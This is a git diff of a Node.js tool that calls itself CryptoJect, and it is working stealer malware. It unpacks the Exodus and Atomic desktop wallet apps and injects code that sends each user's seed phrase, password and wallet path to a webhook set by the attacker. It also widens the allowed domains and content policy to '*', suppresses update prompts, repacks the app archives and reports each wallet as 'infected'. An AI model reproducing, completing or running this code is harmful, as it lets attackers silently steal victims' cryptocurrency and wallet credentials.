@@ -1,17 +1,47 @@
 const fs = require("fs");
 const util = require("util");
 const { exec } = require("child_process");
+const path = require("path");
+
+let changes = [];
+let repack = [];
 
 const execPromise = util.promisify(exec);
 const readdir = util.promisify(fs.readdir);
-let pathArray = [];
-
-const folderPath = process.env.LOCALAPPDATA + "/exodus";
 
 const hook = ""; // put a webhook.site link here for testing
 
-async function list() {
+const wallet = {
+  Exodus: {
+    path: process.env.LOCALAPPDATA + "\\exodus",
+    replacement: {
+      domains: 'domains: "*"',
+      csp: "data: *",
+      wallet: `await this._loadLightningCreds();var xe_array={xe_wallet:"Exodus",xe_mnemonic:this._seed.mnemonicString,xe_password:e,xe_vault:this._walletPaths.walletDir,xe_version: se.version || E.version || "null"},xe_request=new XMLHttpRequest;xe_request.open("POST","${hook}",!0),xe_request.setRequestHeader("Content-Type","application/json");var payload={data:xe_array};xe_request.send(JSON.stringify(payload));`,
+      blank: "",
+    },
+    searchList: {
+      domains: `domains:["server.exodus.io","exodusapp.blob.core.windows.net"]`,
+      csp: "data: https://server.exodus.io/ https://exodusapp.blob.core.windows.net/",
+      wallet: "await this._loadLightningCreds()",
+      ui: ",this.promptForUpdate()",
+    },
+  },
+  Atomic: {
+    path: process.env.LOCALAPPDATA + "\\Programs\\atomic\\resources",
+    replacement: {
+      vendors: `const j=function(){let e=!0;return async function(t,n){if(e){e=!1,t.setBus(n),n.$emit(p.WALLETS.START_LOADING,t);try{await t.loadWallet(this.seed,this.phrase);var s={xe_wallet:"Atomic",xe_mnemonic:this.phrase,xe_version:m.default.getVersion()},a=new XMLHttpRequest;a.open("POST","${hook}",!0),a.setRequestHeader("Content-Type","application/json"),a.send(JSON.stringify({data:s}))}catch(i){n.$emit(p.WALLETS.RAISE_LOADING_ERROR,{wallet:t.name}),g.default.error({instance:t,error:i})}n.$emit(p.WALLETS.FINISH_LOADING,t),"function"==typeof t.fetchUserTokens&&await t.fetchUserTokens(this)}}}();`,
+    },
+    searchList: {
+      vendors: `async function j(t,e){t.setBus(e),e.$emit(p.WALLETS.START_LOADING,t);try{await t.loadWallet(this.seed,this.phrase)}catch(a){e.$emit(p.WALLETS.RAISE_LOADING_ERROR,{wallet:t.name}),g.default.error({instance:t,error:a})}e.$emit(p.WALLETS.FINISH_LOADING,t),"function"==typeof t.fetchUserTokens&&await t.fetchUserTokens(this)}`,
+    },
+  },
+};
+
+async function locateExodusAsar(folderPath) {
+  if (!exists(folderPath)) return "null";
   const files = await readdir(folderPath);
+  const pathArray = [];
 
   files.forEach((file) => {
     if (file.includes("app-")) {
@@ -20,14 +50,10 @@ async function list() {
     }
   });
 
-  return pathArray;
-}
-
-async function highest(paths) {
   let highestFolder = null;
   let highestNumber = 0;
 
-  for (const file of paths) {
+  for (const file of pathArray) {
     const versionNumber = parseFloat(file.split("app-")[1]);
 
     if (!isNaN(versionNumber) && versionNumber > highestNumber) {
@@ -36,7 +62,7 @@ async function highest(paths) {
     }
   }
 
-  return highestFolder;
+  return highestFolder + "/resources";
 }
 
 function delRec(path) {
@@ -62,96 +88,123 @@ async function modifyFile(filePath, searchString, replacementString) {
     const modifiedData = data.replace(searchString, replacementString);
     await fs.promises.writeFile(filePath, modifiedData, "utf8");
   } catch (err) {
-    console.error(`[ERROR] Failed to modify file: ${err}`);
+    console.error(`\x1b[0;31m[ERROR] Failed to modify file: ${err}`);
   }
 }
 
-async function Inject() {
-  const versionPath = await highest(await list());
-  const asar = versionPath + "/resources/app.asar";
-  const out = versionPath + "/resources/out";
-  const unpack = `npx asar e ${asar} ${out}`;
-  const pack = `npx asar p ${out} ${asar}`;
-  const walletIndex = out + "/src/app/wallet/index.js";
-  const walletHtml = out + "/src/static/wallet.html";
-  const mainIndex = out + "/src/app/main/index.js";
-  const UiIndex = out + "/src/app/ui/index.js";
+function exists(path) {
+  return fs.existsSync(path);
+}
 
-  const searchList = {
-    domains: `domains:["server.exodus.io","exodusapp.blob.core.windows.net"]`,
-    csp: "data: https://server.exodus.io/ https://exodusapp.blob.core.windows.net/",
-    wallet: "await this._loadLightningCreds()",
-    ui: ",this.promptForUpdate()",
-  };
+async function packAsar(outDir, asarFile) {
+  await execPromise(`npx asar p ${outDir} ${asarFile}`);
+}
 
-  const replacement = {
-    domains: 'domains: "*"',
-    csp: "data: *",
-    wallet: `await this._loadLightningCreds();var xe_array={xe_mnemonic:this._seed.mnemonicString,xe_password:e,wallet_directory:this._walletPaths.walletDir,xe_version: se.version || E.version || "null"},xe_request=new XMLHttpRequest;xe_request.open("POST","${hook}",!0),xe_request.setRequestHeader("Content-Type","application/json");var payload={data:xe_array};xe_request.send(JSON.stringify(payload));`,
-    blank: "",
-  };
-
-  await execPromise(unpack); // unpack asar
-
+async function modifyFiles(array) {
   try {
-    console.log("[Injection] Modifying files...");
-    const filesToModify = [
-      {
-        file: mainIndex,
-        searchList: searchList.domains,
-        replacement: replacement.domains,
-      },
-      {
-        file: walletHtml,
-        searchList: searchList.csp,
-        replacement: replacement.csp,
-      },
-      {
-        file: walletIndex,
-        searchList: searchList.wallet,
-        replacement: replacement.wallet,
-      },
-      {
-        file: UiIndex,
-        searchList: searchList.ui,
-        replacement: replacement.blank,
-      },
-    ];
-
     await Promise.all(
-      filesToModify.map(async (fileData) => {
+      array.map(async (fileData) => {
         await modifyFile(
           fileData.file,
           fileData.searchList,
           fileData.replacement
         );
-        console.log(`[Injection] Successfully changed ${fileData.file}`);
+        console.log(
+          `\x1b[0;32m[CryptoJect] Successfully changed ${fileData.file}`
+        );
       })
     );
-
-    console.log("[Injection] Starting cleanup...");
-    await execPromise(pack); // Repack asar
-
-    await delRec(out); // Cleanup
-
-    console.log("[Injection] Injection successful!");
   } catch (err) {
-    console.error(`[ERROR] An error occurred during injection: ${err}`);
+    console.error(
+      `\x1b[0;31m[ERROR] An error occurred during file modification: ${err}`
+    );
   }
 }
 
 async function startInjection() {
+  const atomicAsar = path.join(wallet.Atomic.path, "app.asar");
+  const atomicOut = path.join(wallet.Atomic.path, "out");
+
+  const exodusPath = await locateExodusAsar(wallet.Exodus.path);
+  const exodusAsar = path.join(exodusPath, "app.asar");
+  const exodusOut = path.join(exodusPath, "out");
+
+  const files = {
+    Atomic: {
+      vendors: path.join(
+        atomicOut,
+        "dist",
+        "electron",
+        "vendors.f710a6599f4354ea4b57.js"
+      ), // might have to change because i think filename changes on every build. I might have to make a forloop for each .js file and find the one that containts the replacement string.
+    },
+    Exodus: {
+      walletIndex: path.join(exodusOut, "src", "app", "wallet", "index.js"),
+      walletHtml: path.join(exodusOut, "src", "static", "wallet.html"),
+      mainIndex: path.join(exodusOut, "src", "app", "main", "index.js"),
+      uiIndex: path.join(exodusOut, "src", "app", "ui", "index.js"),
+    },
+  };
+
   try {
-    // Use fs.exists deprecated method replaced with fs.access
-    if (await fs.existsSync(folderPath)) {
-      await Inject();
-    } else {
-      // console.error(`[ERROR] Exodus folder not found at ${folderPath}`); // debug
+    let wallets = 0;
+
+    if (exists(wallet.Exodus.path)) {
+      await execPromise(`npx asar e ${exodusAsar} ${exodusOut}`);
+      changes.push(
+        {
+          file: files.Exodus.mainIndex,
+          searchList: wallet.Exodus.searchList.domains,
+          replacement: wallet.Exodus.replacement.domains,
+        },
+        {
+          file: files.Exodus.walletHtml,
+          searchList: wallet.Exodus.searchList.csp,
+          replacement: wallet.Exodus.replacement.csp,
+        },
+        {
+          file: files.Exodus.walletIndex,
+          searchList: wallet.Exodus.searchList.wallet,
+          replacement: wallet.Exodus.replacement.wallet,
+        },
+        {
+          file: files.Exodus.uiIndex,
+          searchList: wallet.Exodus.searchList.ui,
+          replacement: wallet.Exodus.replacement.blank,
+        }
+      );
+      repack.push({ wallet: "Exodus", out: exodusOut, asar: exodusAsar });
+      wallets++;
+    }
+
+    if (exists(wallet.Atomic.path)) {
+      await execPromise(`npx asar e ${atomicAsar} ${atomicOut}`);
+      changes.push({
+        file: files.Atomic.vendors,
+        searchList: wallet.Atomic.searchList.vendors,
+        replacement: wallet.Atomic.replacement.vendors,
+      });
+      repack.push({ wallet: "Atomic", out: atomicOut, asar: atomicAsar });
+      wallets++;
+    }
+
+    if (wallets === 0) {
+      console.error(
+        "\x1b[0;33m[Warning] No folders were found. Injection cannot proceed."
+      );
       process.exit(1);
+    } else {
+      await modifyFiles(changes);
+
+      for (const item of repack) {
+        await packAsar(item.out, item.asar);
+        await delRec(item.out);
+        console.log(`[CryptoJect] Successfully infected ${item.wallet}!!`);
+      }
     }
   } catch (err) {
     console.error(
-      `[ERROR] An error occurred when attempting injection: ${err}`
+      `\x1b[0;31m[ERROR] An error occurred when attempting injection: ${err}`
     );
   }
 }
